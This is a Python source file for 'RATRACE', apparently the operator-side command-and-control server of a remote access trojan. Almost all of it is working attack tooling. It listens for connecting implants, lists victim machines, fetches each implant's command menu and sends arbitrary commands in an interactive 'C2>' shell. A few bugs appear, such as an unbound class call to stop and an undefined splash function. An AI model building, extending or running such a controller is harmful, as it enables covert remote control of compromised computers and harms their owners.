import socket
import threading
import atexit
import signal
import os
import time
from pwn import *

class C2Server:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients = []
        self.current_client_index = 0
        self.running = True
        self.server = None
        self.listening = None

    def start(self):
        if self.server:
            self.server.close()
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(10)
        self.server.settimeout(1.0)
        self.listening = log.waitfor(f"{self.host}:{self.port} Status", status = 'Listening')
        self.listening.success()
        while self.running:
            try:
                client_socket, addr = self.server.accept()
                log.info(f"Accepted connection from {addr[0]}:{addr[1]}")
                self.clients.append(client_socket)
            except socket.timeout:
                continue
            except OSError:
                break

    def stop(self):
        self.running = False
        if self.server:
            try:
                self.server.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            self.server.close()
            self.server= None
        for client in self.clients:
            try:
                client.close()
            except OSError:
                pass
        self.clients.clear()
        if self.listening:
            self.listening.success()


    def select_client(self, choice):
        if not self.clients:
            return None
        self.current_client_index = choice
        return self.clients[self.current_client_index]

    def send_command(self, command):
        client = self.select_client(self.current_client_index)
        if not client:
            log.info("[!] No active clients")
            return
        if command.strip() == "":
            return
        try:
            client.send(command.encode())
            time.sleep(0.01)
            response = client.recv(4096).decode()
            return response
        except Exception as e:
            log.info(f"[!] Error: {e}")
            self.clients.remove(client)


if __name__ == "__main__":
    items = ["Start Server","Check Clients", "Connect to Client", "Exit"]
    running = False
    server = C2Server()
    server_thread = None

    atexit.register(server.stop)

    def handle_sigint(sig, frame):
        log.info("Caught CTRL + C, Shutting Down")
        server.stop()
        exit(0)
    signal.signal(signal.SIGINT, handle_sigint)

    def resetgui():
        time.sleep(0.01)
        input("\nPress enter to continue...")
        os.system("clear")
        
    def interactive():
        run = True
        runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
        while run:
            command = str_input('C2> ')
            if command == "return":
                    run = False
            else:
                server.send_command(command)
        runstatus.success()

    ratrace = True
    while ratrace:
        choice = options('Welcome to RATRACE - Make your Selection', items)
        if choice == 0:		#Start / Stop Server
            if not running:
                server.running = True
                server_thread = threading.Thread(target=server.start)
                server_thread.daemon = True
                server_thread.start()
                items[0] = "Stop Server"
                running = True
            elif running:
                server.stop()
                items[0] = "Start Server"
                running = False
        elif choice == 1: 	 #List Clients
            if len(server.clients) > 0:
                log.info("FORMAT: ('REMOTE ADDR', REMOTE PORT)")
                for client in server.clients:
                    format = str(client).split("raddr=")
                    format = format[1].strip(">")
                    log.info(format)
            else:
                log.info("No clients connected")
        elif choice == 2:	# Connect to a Client
                if len(server.clients) > 0:
                    targets = []
                    for client in server.clients:
                        format = str(client).split("raddr=")
                        format = format[1].strip(">")
                        targets.append(format)
                    target = options('Select a client:', targets)
                    server.select_client(target)
                    implant = server.send_command("info").split(' ')
                    implant.append("interactive")
                    implant.append("return")
                    run = True
                    while run:
                        c2choice = (options(f'Connected to {implant[0]} on {targets[target]}', implant[1:]) + 1)
                        if implant[c2choice] != "return":
                            if implant[c2choice] == "interactive":
                                interactive()
                            else:
                                server.send_command(implant[c2choice])
                            resetgui()
                        else:
                            log.info("Returning...\n")
                            run = False
                                                
                else:
                    log.info("No clients connected")
        else:
            C2Server.stop()
            os.system("clear")
            ratrace = False
            splash()
        resetgui()


        #command = str_input('C2> ')
        #server.send_command(command)
